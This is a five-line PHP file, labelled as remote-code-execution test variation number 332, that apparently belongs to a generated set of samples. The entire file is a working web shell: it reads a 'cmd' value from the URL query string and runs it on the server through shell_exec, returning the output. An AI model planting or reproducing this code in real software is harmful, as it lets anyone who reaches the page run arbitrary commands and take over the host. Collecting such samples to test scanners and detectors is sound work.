<?php
// RCE test variation #332
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>